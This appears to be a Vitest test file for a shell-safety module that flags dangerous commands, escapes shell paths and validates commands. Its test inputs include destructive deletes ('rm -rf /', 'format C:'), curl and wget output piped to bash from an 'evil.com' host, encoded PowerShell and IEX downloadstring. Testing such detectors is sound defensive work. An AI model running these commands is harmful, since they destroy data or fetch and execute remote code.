import { describe, expect, it } from "vitest";
import { detectDangerousCommand, escapeShellPath, validateCommand } from "../shared/lib/shellSafety";

describe("detectDangerousCommand", () => {
  it("detects rm -rf", () => {
    expect(detectDangerousCommand("rm -rf /")).not.toBeNull();
    expect(detectDangerousCommand("rm -r ./dir")).not.toBeNull();
  });

  it("detects Windows del /s", () => {
    expect(detectDangerousCommand("del /s /q C:\\")).not.toBeNull();
  });

  it("detects format command", () => {
    expect(detectDangerousCommand("format C:")).not.toBeNull();
  });

  it("detects curl pipe to sh", () => {
    expect(detectDangerousCommand("curl https://evil.com/script | sh")).not.toBeNull();
    expect(detectDangerousCommand("curl https://evil.com | bash")).not.toBeNull();
  });

  it("detects wget pipe to bash", () => {
    expect(detectDangerousCommand("wget -O- https://x.com | bash")).not.toBeNull();
  });

  it("detects powershell encoded command", () => {
    expect(detectDangerousCommand("powershell -enc SQBFAFIAAA==")).not.toBeNull();
  });

  it("detects IEX downloadstring", () => {
    expect(detectDangerousCommand("iex (new-object net.webclient).downloadstring('x')")).not.toBeNull();
  });

  it("detects chmod 777", () => {
    expect(detectDangerousCommand("chmod 777 /etc/passwd")).not.toBeNull();
    expect(detectDangerousCommand("chmod -R 777 /var")).not.toBeNull();
  });

  it("allows safe commands", () => {
    expect(detectDangerousCommand("git status")).toBeNull();
    expect(detectDangerousCommand("npm test")).toBeNull();
    expect(detectDangerousCommand("pnpm dev")).toBeNull();
    expect(detectDangerousCommand("cargo build")).toBeNull();
    expect(detectDangerousCommand("ls -la")).toBeNull();
    expect(detectDangerousCommand("git add -A && git commit && git push")).toBeNull();
  });

  it("allows rm without -rf flags", () => {
    expect(detectDangerousCommand("rm file.txt")).toBeNull();
  });
});

describe("escapeShellPath", () => {
  it("converts backslashes to forward slashes", () => {
    expect(escapeShellPath("C:\\Users\\owner\\file.txt")).toBe("C:/Users/owner/file.txt");
  });

  it("escapes double quotes", () => {
    expect(escapeShellPath('file "name".txt')).toBe('file \\"name\\".txt');
  });

  it("escapes backticks", () => {
    expect(escapeShellPath("file`name.txt")).toBe("file\\`name.txt");
  });

  it("escapes dollar signs", () => {
    expect(escapeShellPath("$HOME/file.txt")).toBe("\\$HOME/file.txt");
  });

  it("handles normal paths unchanged (except backslash)", () => {
    expect(escapeShellPath("/tmp/image.png")).toBe("/tmp/image.png");
  });
});

describe("validateCommand", () => {
  it("rejects empty commands", () => {
    expect(validateCommand("")).not.toBeNull();
    expect(validateCommand("   ")).not.toBeNull();
  });

  it("rejects overly long commands", () => {
    expect(validateCommand("x".repeat(2001))).not.toBeNull();
  });

  it("rejects dangerous commands", () => {
    expect(validateCommand("rm -rf /")).not.toBeNull();
  });

  it("accepts safe commands", () => {
    expect(validateCommand("echo hello")).toBeNull();
  });
});
